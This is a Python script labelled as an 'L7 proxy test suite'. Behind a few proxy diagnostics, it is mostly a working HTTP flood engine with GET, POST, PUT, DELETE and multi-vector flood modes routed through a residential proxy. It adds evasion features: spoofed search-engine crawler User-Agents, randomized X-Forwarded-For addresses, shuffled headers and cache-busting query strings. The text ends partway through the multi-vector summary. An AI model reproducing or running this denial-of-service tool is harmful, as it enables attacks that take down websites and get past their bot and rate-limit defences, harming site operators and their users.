#!/usr/bin/env python3
"""
L7 Proxy Test Suite
-------------------
Tests Layer-7 (HTTP/HTTPS application-layer) events through a
Squid/ProxyChains residential proxy at 10.0.10.118:3128.

Modes (selected from interactive menu):
  1  Diagnostic      – 10 sequential diagnostic tests
  2  GET Flood
  3  POST Flood
  4  HEAD Flood
  5  PUT Flood
  6  PATCH Flood
  7  DELETE Flood
  8  OPTIONS Flood
  9  Multi-Vector    – fires ALL methods simultaneously

Flood engine:
  Each worker thread opens ONE persistent HTTP keep-alive connection through
  the proxy and fires requests in a tight loop for the full duration.
  This eliminates TCP-setup overhead per request, enabling 1k-5k+ RPS
  per connection depending on proxy/target latency.
"""

import sys
import time
import socket
import ssl
import json
import random
import string
import threading
import urllib.request
import urllib.error
import urllib.parse
import http.client
from datetime import datetime
from typing import Optional, Tuple, List, Dict

# ── Proxy config ──────────────────────────────────────────────────────────────
PROXY_HOST = "10.0.10.118"
PROXY_PORT = 3128
PROXY_URL  = "http://{}:{}".format(PROXY_HOST, PROXY_PORT)

# ── Colour helpers ─────────────────────────────────────────────────────────────
GREEN   = "\033[92m"
RED     = "\033[91m"
YELLOW  = "\033[93m"
CYAN    = "\033[96m"
MAGENTA = "\033[95m"
BOLD    = "\033[1m"
DIM     = "\033[2m"
RESET   = "\033[0m"

def ok(msg):    print("  {}[+]{} {}".format(GREEN, RESET, msg))
def fail(msg):  print("  {}[-]{} {}".format(RED, RESET, msg))
def info(msg):  print("  {}[*]{} {}".format(CYAN, RESET, msg))
def warn(msg):  print("  {}[!]{} {}".format(YELLOW, RESET, msg))
def section(title):
    print("\n{}{}{}{}".format(BOLD, CYAN, "─"*60, RESET))
    print("{}{}  {}{}".format(BOLD, CYAN, title, RESET))
    print("{}{}{}{}".format(BOLD, CYAN, "─"*60, RESET))

# ── Build a urllib opener that forces all traffic through the proxy ────────────
def build_opener():
    proxy_handler = urllib.request.ProxyHandler({
        "http":  PROXY_URL,
        "https": PROXY_URL,
    })
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    https_handler = urllib.request.HTTPSHandler(context=ctx)
    opener = urllib.request.build_opener(proxy_handler, https_handler)
    opener.addheaders = [
        ("User-Agent",
         "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
         "(KHTML, like Gecko) Chrome/124.0 Safari/537.36"),
        ("Accept",          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),
        ("Accept-Language", "en-US,en;q=0.5"),
        ("Connection",      "keep-alive"),
    ]
    return opener

OPENER = build_opener()

# ─────────────────────────────────────────────────────────────────────────────
# 1. Proxy Reachability
# ─────────────────────────────────────────────────────────────────────────────
def test_proxy_reachability():
    section("TEST 1 – Proxy Reachability (TCP handshake to squid)")
    try:
        t0 = time.time()
        s  = socket.create_connection((PROXY_HOST, PROXY_PORT), timeout=5)
        ms = (time.time() - t0) * 1000
        s.close()
        ok("Connected to {}:{} in {:.1f} ms".format(PROXY_HOST, PROXY_PORT, ms))
        return True
    except Exception as e:
        fail("Cannot reach proxy: {}".format(e))
        return False

# ─────────────────────────────────────────────────────────────────────────────
# 2. External IP leak check
# ─────────────────────────────────────────────────────────────────────────────
def test_egress_ip():
    section("TEST 2 – Egress IP via Proxy  (IP-leak check)")
    for url in ["http://httpbin.org/ip", "http://ifconfig.me/ip"]:
        try:
            t0  = time.time()
            req = urllib.request.Request(url)
            with OPENER.open(req, timeout=10) as resp:
                body = resp.read().decode().strip()
            ms  = (time.time() - t0) * 1000
            try:
                ip = json.loads(body).get("origin", body)
            except Exception:
                ip = body
            ok("Egress IP reported by {}: {}{}{}  ({:.0f} ms)".format(
                url.split("/")[2], BOLD, ip, RESET, ms))
            return ip
        except Exception as e:
            warn("{} failed: {}".format(url, e))
    fail("Could not determine egress IP")
    return None

# ─────────────────────────────────────────────────────────────────────────────
# 3. HTTP GET
# ─────────────────────────────────────────────────────────────────────────────
def test_http_get(target_url):
    section("TEST 3 – HTTP GET  →  {}".format(target_url))
    try:
        req = urllib.request.Request(target_url, method="GET")
        t0  = time.time()
        with OPENER.open(req, timeout=15) as resp:
            status  = resp.status
            headers = dict(resp.headers)
            body    = resp.read()
        ms = (time.time() - t0) * 1000
        ok("Status        : {} {}".format(status, resp.reason))
        ok("Response time : {:.0f} ms".format(ms))
        ok("Body length   : {:,} bytes".format(len(body)))
        info("Server        : {}".format(headers.get("Server", "n/a")))
        info("Content-Type  : {}".format(headers.get("Content-Type", "n/a")))
        info("X-Cache       : {}".format(headers.get("X-Cache", "n/a")))
        return True
    except urllib.error.HTTPError as e:
        warn("HTTP error {}: {}".format(e.code, e.reason))
        return False
    except Exception as e:
        fail("GET failed: {}".format(e))
        return False

# ─────────────────────────────────────────────────────────────────────────────
# 4. HTTP HEAD
# ─────────────────────────────────────────────────────────────────────────────
def test_http_head(target_url):
    section("TEST 4 – HTTP HEAD  →  {}".format(target_url))
    try:
        req = urllib.request.Request(target_url, method="HEAD")
        t0  = time.time()
        with OPENER.open(req, timeout=10) as resp:
            status  = resp.status
            headers = dict(resp.headers)
        ms = (time.time() - t0) * 1000
        ok("Status : {} {}  ({:.0f} ms)".format(status, resp.reason, ms))
        for h in ["Server", "Content-Type", "X-Powered-By",
                  "Strict-Transport-Security", "X-Frame-Options",
                  "X-Content-Type-Options", "Content-Security-Policy"]:
            val = headers.get(h)
            if val:
                info("{:35s}: {}".format(h, val))
        return True
    except urllib.error.HTTPError as e:
        warn("HTTP {} on HEAD – trying GET fallback".format(e.code))
        return False
    except Exception as e:
        fail("HEAD failed: {}".format(e))
        return False

# ─────────────────────────────────────────────────────────────────────────────
# 5. HTTP OPTIONS
# ─────────────────────────────────────────────────────────────────────────────
def test_http_options(target_url):
    section("TEST 5 – HTTP OPTIONS  →  {}".format(target_url))
    try:
        req = urllib.request.Request(target_url, method="OPTIONS")
        req.add_header("Origin", "https://evil.lab")
        req.add_header("Access-Control-Request-Method", "GET")
        t0  = time.time()
        with OPENER.open(req, timeout=10) as resp:
            headers = dict(resp.headers)
            status  = resp.status
        ms = (time.time() - t0) * 1000
        ok("Status : {}  ({:.0f} ms)".format(status, ms))
        for h in ["Allow", "Access-Control-Allow-Origin",
                  "Access-Control-Allow-Methods",
                  "Access-Control-Allow-Headers"]:
            val = headers.get(h)
            if val:
                info("{:40s}: {}".format(h, val))
        return True
    except urllib.error.HTTPError as e:
        warn("HTTP {} – server may not allow OPTIONS".format(e.code))
    except Exception as e:
        fail("OPTIONS failed: {}".format(e))
    return False

# ─────────────────────────────────────────────────────────────────────────────
# 6. Redirect-chain follow
# ─────────────────────────────────────────────────────────────────────────────
def test_redirect_chain(target_url):
    section("TEST 6 – Redirect Chain  →  {}".format(target_url))
    visited = []
    current = target_url

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE

    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            return None

    no_redir_opener = urllib.request.build_opener(
        urllib.request.ProxyHandler({"http": PROXY_URL, "https": PROXY_URL}),
        urllib.request.HTTPSHandler(context=ctx),
        NoRedirect(),
    )
    no_redir_opener.addheaders = OPENER.addheaders

    for hop in range(10):
        try:
            req = urllib.request.Request(current)
            with no_redir_opener.open(req, timeout=10) as resp:
                status   = resp.status
                location = resp.headers.get("Location")
                visited.append((hop + 1, current, status))
                if status not in (301, 302, 303, 307, 308) or not location:
                    break
                current = urllib.parse.urljoin(current, location)
        except urllib.error.HTTPError as e:
            visited.append((hop + 1, current, e.code))
            break
        except Exception as e:
            fail("Redirect hop {} error: {}".format(hop + 1, e))
            break

    for hop, url, code in visited:
        colour = GREEN if str(code).startswith("2") else YELLOW
        print("  {}Hop {}: [{}] {}{}".format(colour, hop, code, url, RESET))

# ─────────────────────────────────────────────────────────────────────────────
# 7. DNS resolution
# ─────────────────────────────────────────────────────────────────────────────
def test_dns(hostname):
    section("TEST 7 – DNS Resolution  →  {}".format(hostname))
    try:
        t0      = time.time()
        results = socket.getaddrinfo(hostname, 80)
        ms      = (time.time() - t0) * 1000
        ips     = list({str(r[4][0]) for r in results})
        ok("Resolved in {:.1f} ms  →  {}".format(ms, ", ".join(ips)))
        return ips
    except Exception as e:
        fail("DNS failed: {}".format(e))
        return []

# ─────────────────────────────────────────────────────────────────────────────
# 8. TLS/SSL Certificate info
# ─────────────────────────────────────────────────────────────────────────────
def test_tls(hostname, port=443):
    section("TEST 8 – TLS Certificate  →  {}:{}".format(hostname, port))
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE

        proxy_conn = http.client.HTTPConnection(PROXY_HOST, PROXY_PORT, timeout=10)
        proxy_conn.set_tunnel(hostname, port)
        proxy_conn.connect()
        raw_sock = proxy_conn.sock

        tls_sock = ctx.wrap_socket(raw_sock, server_hostname=hostname)
        cert     = tls_sock.getpeercert()
        cipher   = tls_sock.cipher()
        proto    = tls_sock.version()
        tls_sock.close()

        ok("TLS version : {}".format(proto))
        ok("Cipher      : {}".format(cipher[0] if cipher else "n/a"))
        if cert:
            subject = {}
            for rdn in cert.get("subject", []):
                for attr in rdn:
                    subject[attr[0]] = attr[1]
            issuer = {}
            for rdn in cert.get("issuer", []):
                for attr in rdn:
                    issuer[attr[0]] = attr[1]
            info("Subject CN  : {}".format(subject.get("commonName", "n/a")))
            info("Issuer      : {}".format(issuer.get("organizationName", "n/a")))
            info("Not before  : {}".format(cert.get("notBefore", "n/a")))
            info("Not after   : {}".format(cert.get("notAfter",  "n/a")))
        else:
            warn("Certificate data not exposed (verify mode is CERT_NONE)")
        return True
    except Exception as e:
        fail("TLS probe failed: {}".format(e))
        return False

# ─────────────────────────────────────────────────────────────────────────────
# 9. HTTP POST
# ─────────────────────────────────────────────────────────────────────────────
def test_http_post(target_url):
    section("TEST 9 – HTTP POST  →  {}".format(target_url))
    payload = json.dumps({"test": "l7_probe", "ts": datetime.utcnow().isoformat()}).encode()
    try:
        req = urllib.request.Request(target_url, data=payload, method="POST")
        req.add_header("Content-Type", "application/json")
        t0  = time.time()
        with OPENER.open(req, timeout=15) as resp:
            status = resp.status
            body   = resp.read()
        ms = (time.time() - t0) * 1000
        ok("Status : {}  ({:.0f} ms)  body={:,} bytes".format(status, ms, len(body)))
        return True
    except urllib.error.HTTPError as e:
        warn("HTTP {} on POST ({}) – may be expected".format(e.code, e.reason))
    except Exception as e:
        fail("POST failed: {}".format(e))
    return False

# ─────────────────────────────────────────────────────────────────────────────
# 10. Latency benchmark
# ─────────────────────────────────────────────────────────────────────────────
def test_latency(target_url, samples=10):
    section("TEST 10 – Latency Benchmark  ({}× GET)  →  {}".format(samples, target_url))
    times = []
    for i in range(1, samples + 1):
        try:
            req = urllib.request.Request(target_url, method="HEAD")
            t0  = time.time()
            with OPENER.open(req, timeout=10) as resp:
                resp.read()
            ms = (time.time() - t0) * 1000
            times.append(ms)
            print("    Sample {:>2}/{}: {:>7.1f} ms".format(i, samples, ms))
        except Exception as e:
            warn("Sample {} failed: {}".format(i, e))
        time.sleep(0.3)

    if times:
        avg = sum(times) / len(times)
        mn  = min(times)
        mx  = max(times)
        jit = mx - mn
        ok("Min={:.1f} ms  Avg={:.1f} ms  Max={:.1f} ms  Jitter={:.1f} ms".format(mn, avg, mx, jit))
    else:
        fail("No latency samples collected")

# ─────────────────────────────────────────────────────────────────────────────
# FLOOD ENGINE  – persistent keep-alive connections
# ─────────────────────────────────────────────────────────────────────────────
# Each worker thread:
#   1. Opens one TCP connection to the proxy
#   2. Sends CONNECT to tunnel to the target (for HTTPS)
#   3. Reuses the same connection in a tight loop for the full duration
#   4. On any connection error, reconnects and continues
#
# This eliminates per-request TCP setup and proxy CONNECT overhead,
# allowing each thread to reach 1,000–5,000+ req/s depending on
# proxy/target response latency.
# ─────────────────────────────────────────────────────────────────────────────

_BODY_METHODS = {"POST", "PUT", "PATCH"}

# ── Active flood config (set from preset menu) ────────────────────────────────
_EVASION_PROFILE = ["rotate"]   # UA pool key
_HEADER_SHUFFLE  = [False]      # shuffle header order per request
_QS_INJECT       = ["off"]      # "off" | "random" | "always"

# ─────────────────────────────────────────────────────────────────────────────
# User-Agent library  (legitimate + spoofed categories)
# ─────────────────────────────────────────────────────────────────────────────
_UA_POOLS = {
    "legit_desktop": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    ],
    "legit_mobile": [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.6367.88 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36 SamsungBrowser/24.0",
        "Mozilla/5.0 (Linux; Android 13; Redmi Note 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    ],
    "spoofed_bots": [
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
        "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
        "Twitterbot/1.0",
        "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)",
        "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
        "WhatsApp/2.24.8.77 A",
        "Mozilla/5.0 (compatible; DuckDuckBot/1.1; +http://duckduckgo.com/duckduckbot.html)",
        "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    ],
    "spoofed_evasion": [
        "curl/8.7.1",
        "python-requests/2.31.0",
        "Go-http-client/1.1",
        "Wget/1.21.4 (linux-gnu)",
        "axios/1.6.8",
        "okhttp/4.12.0",
        "Java/21.0.2",
        "Apache-HttpClient/4.5.14 (Java/11.0.22)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
        "Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0)",
        "---",
        "x" * 256,
    ],
    "rotate": [],
}
for _pn, _pl in _UA_POOLS.items():
    if _pn != "rotate":
        _UA_POOLS["rotate"].extend([ua for ua in _pl if ua])

_ACCEPT_LANGS = [
    "en-US,en;q=0.9", "en-GB,en;q=0.8,en-US;q=0.6",
    "fr-FR,fr;q=0.9,en;q=0.7", "de-DE,de;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.7", "zh-CN,zh;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8", "pt-BR,pt;q=0.9,en;q=0.7",
    "ru-RU,ru;q=0.8,en;q=0.6", "ar-SA,ar;q=0.9,en;q=0.7", "*",
]

_ACCEPTS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*",
    "*/*", "text/html,*/*;q=0.9", "application/json", "text/html",
]

_EXTRA_HEADERS = [
    ("X-Forwarded-For",   lambda: "{}.{}.{}.{}".format(
        random.randint(1,254), random.randint(0,255),
        random.randint(0,255), random.randint(1,254))),
    ("X-Real-IP",         lambda: "{}.{}.{}.{}".format(
        random.randint(1,254), random.randint(0,255),
        random.randint(0,255), random.randint(1,254))),
    ("X-Originating-IP",  lambda: "{}.{}.{}.{}".format(
        random.randint(1,254), random.randint(0,255),
        random.randint(0,255), random.randint(1,254))),
    ("Referer",           lambda: random.choice([
        "https://www.google.com/", "https://www.bing.com/",
        "https://t.co/", "https://l.facebook.com/", "https://duckduckgo.com/",
    ])),
    ("Cache-Control",     lambda: random.choice(["no-cache", "max-age=0", "no-store"])),
    ("Pragma",            lambda: "no-cache"),
    ("DNT",               lambda: random.choice(["0", "1"])),
    ("Upgrade-Insecure-Requests", lambda: "1"),
    ("Sec-Fetch-Mode",    lambda: random.choice(["navigate", "cors", "no-cors", "same-origin"])),
    ("Sec-Fetch-Site",    lambda: random.choice(["none", "same-origin", "cross-site", "same-site"])),
    ("Sec-Fetch-Dest",    lambda: random.choice(["document", "empty", "image", "script"])),
]


def _rand_qs(n=3):
    # type: (int) -> str
    keys  = ["ref", "src", "utm_source", "utm_medium", "q", "s", "id",
              "page", "v", "t", "sid", "token", "cb", "ts", "r"]
    pairs = []
    for _ in range(n):
        k = random.choice(keys)
        v = "".join(random.choices(string.ascii_lowercase + string.digits,
                                   k=random.randint(4, 12)))
        pairs.append("{}={}".format(k, v))
    return "&".join(pairs)


def _build_headers(profile):
    # type: (str) -> List[Tuple[str, str]]
    pool = _UA_POOLS.get(profile, _UA_POOLS["rotate"])
    ua   = random.choice(pool) if pool else "Mozilla/5.0"
    core = [
        ("User-Agent",      ua),
        ("Accept",          random.choice(_ACCEPTS)),
        ("Accept-Language", random.choice(_ACCEPT_LANGS)),
        ("Connection",      "keep-alive"),
    ]
    extras = []
    for hdr_name, hdr_fn in random.sample(_EXTRA_HEADERS, k=random.randint(0, 4)):
        extras.append((hdr_name, hdr_fn()))
    combined = core + extras
    if _HEADER_SHUFFLE[0]:
        ua_hdr = combined[:1]
        rest   = combined[1:]
        random.shuffle(rest)
        return ua_hdr + rest
    return combined


def _inject_qs(url):
    # type: (str) -> str
    mode = _QS_INJECT[0]
    if mode == "off":
        return url
    inject = True if mode == "always" else random.random() < 0.5
    if not inject:
        return url
    sep = "&" if "?" in url else "?"
    return url + sep + _rand_qs(random.randint(1, 4))


def _make_conn(host, port, use_ssl):
    # type: (str, int, bool) -> http.client.HTTPConnection
    """
    Open a persistent connection through the Squid proxy.
    For HTTPS targets, sends HTTP CONNECT first to establish a tunnel.
    Returns a connected HTTPConnection (or HTTPSConnection) ready to use.
    """
    # Always connect to proxy first
    conn = http.client.HTTPConnection(PROXY_HOST, PROXY_PORT, timeout=10)
    conn.connect()

    if use_ssl:
        # Send CONNECT to create a tunnel
        conn.send("CONNECT {}:{} HTTP/1.1\r\nHost: {}:{}\r\n\r\n".format(
            host, port, host, port).encode())
        resp = conn.response_class(conn.sock)
        resp.begin()
        if resp.status != 200:
            conn.close()
            raise ConnectionError("Proxy CONNECT failed: {}".format(resp.status))
        # Drain headers
        resp.read()
        # Wrap with TLS
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        tls_sock = ctx.wrap_socket(conn.sock, server_hostname=host)
        # Replace the connection socket
        conn.sock = tls_sock
    else:
        # For plain HTTP through proxy we use the standard proxy request format
        # (absolute URI), handled per-request in _worker_loop
        pass

    return conn


def _worker_loop(target_url, method, profile, deadline,
                 success, errors, total_sent, latencies, status_counts, lock):
    # type: (...) -> None
    """
    Persistent-connection worker loop.
    Opens ONE connection and fires requests until deadline.
    Reconnects automatically on socket errors.
    """
    parsed     = urllib.parse.urlparse(target_url)
    host       = parsed.hostname or ""
    port       = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_ssl    = parsed.scheme == "https"
    path_base  = parsed.path or "/"
    if parsed.query:
        path_base = path_base + "?" + parsed.query

    # For plain HTTP through proxy we send the full absolute URL as the request target
    # For HTTPS we send just the path (tunnel is already open)
    def _get_request_target():
        p = _inject_qs(path_base)
        if not use_ssl:
            base = "http://{}:{}{}".format(host, port, path_base)
            p    = _inject_qs(base)
        return p

    conn   = None   # type: Optional[http.client.HTTPConnection]
    body_bytes = None  # type: Optional[bytes]
    if method in _BODY_METHODS:
        body_bytes = json.dumps({"probe": "l7_flood"}).encode()

    while time.time() < deadline:
        # (Re)connect if needed
        if conn is None:
            try:
                conn = _make_conn(host, port, use_ssl)
            except Exception:
                time.sleep(0.01)
                continue

        req_target = _get_request_target()
        hdrs       = dict(_build_headers(profile))
        hdrs["Host"] = "{}:{}".format(host, port)
        if body_bytes:
            hdrs["Content-Type"]   = "application/json"
            hdrs["Content-Length"] = str(len(body_bytes))

        t0 = time.time()
        try:
            conn.request(method, req_target, body=body_bytes, headers=hdrs)
            resp   = conn.getresponse()
            status = resp.status
            resp.read()   # drain so connection stays reusable
            ms = (time.time() - t0) * 1000

            with lock:
                total_sent[0] += 1
                if str(status).startswith("2") or str(status).startswith("3"):
                    success[0] += 1
                else:
                    errors[0] += 1
                latencies.append(ms)
                status_counts[status] = status_counts.get(status, 0) + 1

            # If server closes connection, reconnect next iteration
            if resp.will_close:
                conn.close()
                conn = None

        except Exception:
            with lock:
                errors[0]     += 1
                total_sent[0] += 1
            try:
                conn.close()
            except Exception:
                pass
            conn = None

    if conn:
        try:
            conn.close()
        except Exception:
            pass


def run_flood(target_url, workers, rps, duration, method, label=None):
    # type: (str, int, float, float, str, Optional[str]) -> Dict
    """
    Persistent keep-alive flood.
    Each worker thread holds one connection for the full duration.
    RPS cap is enforced via a global token bucket across all threads.
    """
    display_label = label or method
    section(
        "FLOOD — {}{}{}{}  |  {} conns  |  {:.0f} RPS target  |  {:.0f}s\n"
        "  {}Target  : {}{}\n"
        "  {}Proxy   : {}{}\n"
        "  {}Engine  : {}persistent keep-alive (1 conn/thread){}".format(
            BOLD, display_label, RESET, CYAN,
            workers, rps, duration,
            CYAN, target_url, RESET,
            CYAN, PROXY_URL, RESET,
            CYAN, DIM, RESET,
        )
    )

    success       = [0]
    errors        = [0]
    total_sent    = [0]
    latencies     = []   # type: List[float]
    status_counts = {}   # type: Dict[int, int]
    lock          = threading.Lock()

    wall_start = time.time()
    deadline   = wall_start + duration
    bar_width  = 40

    # Token-bucket rate limiter shared across threads
    _tb_lock   = threading.Lock()
    _tb_tokens = [float(workers)]   # start full
    _tb_last   = [wall_start]
    _tb_cap    = float(workers)
    _rps_per_thread = rps / workers if workers > 0 else rps

    def _acquire_token():
        # type: () -> None
        """Block until a rate-limit token is available."""
        if rps <= 0:
            return
        while True:
            with _tb_lock:
                now   = time.time()
                delta = now - _tb_last[0]
                _tb_last[0] = now
                _tb_tokens[0] = min(_tb_cap, _tb_tokens[0] + delta * rps)
                if _tb_tokens[0] >= 1.0:
                    _tb_tokens[0] -= 1.0
                    return
            time.sleep(0.0002)

    def _print_progress():
        elapsed    = time.time() - wall_start
        pct        = min(elapsed / duration, 1.0)
        filled     = int(bar_width * pct)
        bar        = "\u2588" * filled + "\u2591" * (bar_width - filled)
        actual_rps = total_sent[0] / elapsed if elapsed > 0 else 0
        print(
            "\r  [{}] {:.1f}/{:.0f}s  "
            "{}{}{}  {}{}{}  "
            "{}{:.0f} RPS{}   ".format(
                bar, elapsed, duration,
                GREEN, success[0], RESET,
                RED, errors[0], RESET,
                CYAN, actual_rps, RESET,
            ),
            end="", flush=True,
        )

    # Progress printer thread
    _stop_progress = [False]
    def _progress_loop():
        while not _stop_progress[0]:
            _print_progress()
            time.sleep(0.25)

    prog_thread = threading.Thread(target=_progress_loop, daemon=True)
    prog_thread.start()

    # Rate-aware wrapper passed to each worker
    def _rated_worker_loop():
        parsed     = urllib.parse.urlparse(target_url)
        host       = parsed.hostname or ""
        port_num   = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_ssl    = parsed.scheme == "https"
        path_base  = parsed.path or "/"
        if parsed.query:
            path_base = path_base + "?" + parsed.query

        profile = _EVASION_PROFILE[0]
        conn    = None
        body_bytes = json.dumps({"probe": "l7_flood"}).encode() if method in _BODY_METHODS else None

        def _req_target():
            p = _inject_qs(path_base)
            if not use_ssl:
                base = "http://{}:{}{}".format(host, port_num, path_base)
                p    = _inject_qs(base)
            return p

        while time.time() < deadline:
            _acquire_token()
            if conn is None:
                try:
                    conn = _make_conn(host, port_num, use_ssl)
                except Exception:
                    with lock:
                        errors[0]     += 1
                        total_sent[0] += 1
                    time.sleep(0.01)
                    continue

            req_target = _req_target()
            hdrs       = dict(_build_headers(profile))
            hdrs["Host"] = "{}:{}".format(host, port_num)
            if body_bytes:
                hdrs["Content-Type"]   = "application/json"
                hdrs["Content-Length"] = str(len(body_bytes))

            t0 = time.time()
            try:
                conn.request(method, req_target, body=body_bytes, headers=hdrs)
                resp   = conn.getresponse()
                status = resp.status
                resp.read()
                ms = (time.time() - t0) * 1000
                with lock:
                    total_sent[0] += 1
                    if str(status).startswith("2") or str(status).startswith("3"):
                        success[0] += 1
                    else:
                        errors[0] += 1
                    latencies.append(ms)
                    status_counts[status] = status_counts.get(status, 0) + 1
                if resp.will_close:
                    conn.close()
                    conn = None
            except Exception:
                with lock:
                    errors[0]     += 1
                    total_sent[0] += 1
                try:
                    conn.close()
                except Exception:
                    pass
                conn = None

        if conn:
            try:
                conn.close()
            except Exception:
                pass

    threads = [threading.Thread(target=_rated_worker_loop, daemon=True)
               for _ in range(workers)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    _stop_progress[0] = True
    prog_thread.join(timeout=1)
    print()

    wall_elapsed = time.time() - wall_start
    colour = MAGENTA if label else CYAN
    print("\n{}  ── {}{}{} Flood Summary {}{}{}".format(
        BOLD, colour, display_label, RESET, BOLD, "─"*30, RESET))
    ok("Total sent     : {:,}".format(total_sent[0]))
    ok("Succeeded      : {}{:,}{}".format(GREEN, success[0], RESET))
    if errors[0]:
        warn("Failed         : {}{:,}{}".format(RED, errors[0], RESET))
    ok("Wall time      : {:.2f} s".format(wall_elapsed))
    ok("Throughput     : {}{:.0f} RPS{}".format(
        BOLD, total_sent[0] / wall_elapsed if wall_elapsed > 0 else 0, RESET))

    if latencies:
        latencies.sort()
        avg = sum(latencies) / len(latencies)
        p50 = latencies[int(len(latencies) * 0.50)]
        p90 = latencies[int(len(latencies) * 0.90)]
        p99 = latencies[int(len(latencies) * 0.99)]
        ok("Latency avg    : {:.2f} ms".format(avg))
        ok("Latency p50    : {:.2f} ms".format(p50))
        ok("Latency p90    : {:.2f} ms".format(p90))
        ok("Latency p99    : {:.2f} ms".format(p99))

    print("\n  {}HTTP status breakdown:{}".format(DIM, RESET))
    for code in sorted(status_counts):
        col = GREEN if str(code).startswith("2") else (
              YELLOW if str(code).startswith("3") else RED)
        print("    {}HTTP {}{} : {:,}".format(col, code, RESET, status_counts[code]))

    return {
        "method":     display_label,
        "total":      total_sent[0],
        "success":    success[0],
        "errors":     errors[0],
        "wall":       wall_elapsed,
        "rps_actual": total_sent[0] / wall_elapsed if wall_elapsed > 0 else 0,
    }


def run_multi_vector(target_url, workers, rps, duration):
    # type: (str, int, float, float) -> None
    methods = ["GET", "POST", "HEAD", "PUT", "PATCH", "DELETE", "OPTIONS"]
    n       = len(methods)
    w_each  = max(1, workers // n)
    r_each  = max(1.0, rps / n)

    section(
        "MULTI-VECTOR FLOOD  |  {} vectors simultaneously\n"
        "  {}{} total conns ({}/vector)  |  {:.0f} total RPS ({:.1f}/vector)  |  {:.0f}s{}\n"
        "  {}Vectors : {}{}\n"
        "  {}Target  : {}{}".format(
            n,
            CYAN, workers, w_each, rps, r_each, duration, RESET,
            CYAN, ", ".join(methods), RESET,
            CYAN, target_url, RESET,
        )
    )

    results     = []   # type: List[Dict]
    result_lock = threading.Lock()

    def _launch(m):
        r = run_flood(target_url=target_url, workers=w_each, rps=r_each,
                      duration=duration, method=m, label=m)
        with result_lock:
            results.append(r)

    threads = [threading.Thread(target=_launch, args=(m,), daemon=True) for m in methods]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    total_sent    = sum(r["total"]      for r in results)
    total_success = sum(r["success"]    for r in results)
    total_errors  = sum(r["errors"]     for r in results)
    combined_rps  = sum(r["rps_actual"] for r in results)

    print("\n{}{}{}{}".format(BOLD, MAGENTA, "="*60, RESET))
    print("{}{}  MULTI-VECTOR AGGREGATE SUMMARY{}".format(BOLD, MAGENTA, RESET))
    print("{}{}{}{}".format(BOLD, MAGENTA, "="*60, RESET))
    ok("Vectors fired  : {}  ({})".format(n, ", ".join(methods)))
    ok("Total requests : {:,}".format(total_sent))
    ok("Succeeded      : {}{:,}{}".format(GREEN, total_success, RESET))
    if total_errors:
        warn("Failed         : {}{:,}{}".format(RED, total_errors, RESET))
